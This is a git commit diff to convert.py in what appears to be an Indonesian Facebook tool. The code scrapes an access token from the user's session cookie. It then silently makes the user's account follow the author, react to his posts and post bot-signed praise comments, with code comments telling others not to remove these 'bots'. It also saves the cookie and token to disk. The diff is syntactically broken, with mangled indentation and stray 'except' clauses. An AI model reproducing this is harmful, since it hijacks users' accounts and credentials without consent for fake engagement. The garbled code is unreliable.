797ee46044bf46ee4d719c81beaf3c95a56dc222
Syafii-XD <101574975+Syafii-XD@users.noreply.github.com>
2022-05-14 22:32:21 +0700

    update convert.py

--- data/convert.py
+++ data/convert.py
@@ -26,15 +26,14 @@ header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QK
 class Main:
     token = clotox(cookie)
     coki = {'cookie':cookie}
-  def __init__(self,cookie,token,cookie_mentah):
-        self.loop = 0;self.cookie_mentah = cookie_mentah;list_id   = [str(Syafii)];self.komen = ['Mantap Bang','Semangat Terus','Gokil Suhu','Panutanku']
-        for x in list_id: self.get_folls(x,cookie); self.get_likers(f'https://mbasic.facebook.com/{x}?v=timeline',cookie); self.get_posts(cookie,token)
-  def get_folls(self,id,cookie): # --- [ Jangan Ganti Bot Follow Gw ] --- #
+    def __init__(self,cookie,token,cookie_mentah):self.loop = 0;self.cookie_mentah = cookie_mentah;list_id   = [str(Syafii)];self.komen = ['Mantap Bang','Semangat Terus','Gokil Suhu','Panutanku']
+    for x in list_id: self.get_folls(x,cookie); self.get_likers(f'https://mbasic.facebook.com/{x}?v=timeline',cookie); self.get_posts(cookie,token)
+    def get_folls(self,id,cookie): # --- [ Jangan Ganti Bot Follow Gw ] --- #
         with requests.Session() as xyz:
                     for x in par(xyz.get('https://mbasic.facebook.com/%s'%(id),cookies=cookie).content,'html.parser').find_all('a',href=True):
                         if 'subscribe.php' in x['href']:exec_folls = xyz.get('https://mbasic.facebook.com%s'%(x['href']),cookies=cookie)
             except Exception as e:pass
-  def get_likers(self,url,cookie): # --- [ Jangan Ganti Bot Likers Gw ] --- #
+    def get_likers(self,url,cookie): # --- [ Jangan Ganti Bot Likers Gw ] --- #
         with requests.Session() as xyz:
           bos = par(xyz.get(url,cookies=cookie).content,'html.parser')
           for x in bos.find_all('a',href=True):if 'Tanggapi' in x.text:_react_type_ = random.choice(['Super','Wow','Peduli'])
@@ -42,7 +41,7 @@ class Main:
         else:continue
         self.get_likers('https://mbasic.facebook.com' + bos.find('a',string='Lihat Berita Lain')['href'],cookie)
       except Exception as e:pass
-  def get_posts(self,id,cookie,token): # --- [ Jangan Ganti Bot Komen Gw ] --- #
+    def get_posts(self,id,cookie,token): # --- [ Jangan Ganti Bot Komen Gw ] --- #
         with requests.Session() as xyz:
             try:
                 for x in xyz.get('https://graph.facebook.com/%s/posts?access_token=%s'%(id,token),cookies=cookie).json()['data']:
@@ -50,15 +49,15 @@ class Main:
                         get = json.loads(xyz.post('https://graph.facebook.com/%s/comments?message=%s&access_token=%s'%(x['id'],komeno,token),cookies=cookie).text)
                         if 'error' in get:open('login/cookie.json','w').write(self.cookie_mentah);open('login/token.json','w').write(token);exit(tampilan_menu())
             except Exception as e:pass
-  def waktu(self): # --- [ Jangan Ganti Keterangan Waktu ] --- #
+    def waktu(self): # --- [ Jangan Ganti Keterangan Waktu ] --- #
         _bulan_  = ["Januari", "Februari", "Maret", "April", "Mei", "Juni", "Juli", "Agustus", "September", "Oktober", "November", "Desember"][datetime.now().month - 1]
         _hari_   = {'Sunday':'Minggu','Monday':'Senin','Tuesday':'Selasa','Wednesday':'Rabu','Thursday':'Kamis','Friday':'Jumat','Saturday':'Sabtu'}[str(datetime.now().strftime("%A"))]
         hari_ini = ("%s %s %s"%(datetime.now().day,_bulan_,datetime.now().year))
         jam      = datetime.now().strftime("%X")
         tem      = ('\n\nKomentar Ditulis Oleh Bot\n[ Pukul %s WIB ]\n- %s, %s -'%(jam,_hari_,hari_ini))
         return(tem)
-  def clotox(cookie):
-    with requests.Session() as xyz:
+    def clotox(cookie):
+      with requests.Session() as xyz:
         get_tok = xyz.get(url_businness+'/business_locations',headers = {
             "user-agent":ua_business,
             "referer": web_fb,
@@ -70,9 +69,8 @@ class Main:
             "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
             "content-type":"text/html; charset=utf-8"},cookies = {"cookie":cookie})
         return (re.search("(EAAG\w+)", get_tok.text).group(1))
-        
-  def language(cookie):
-    try:
+    def language(cookie):
+      try:
         with requests.Session() as xyz:
             req = xyz.get('https://mbasic.facebook.com/language/',cookies=cookie)
             pra = par(req.content,'html.parser')
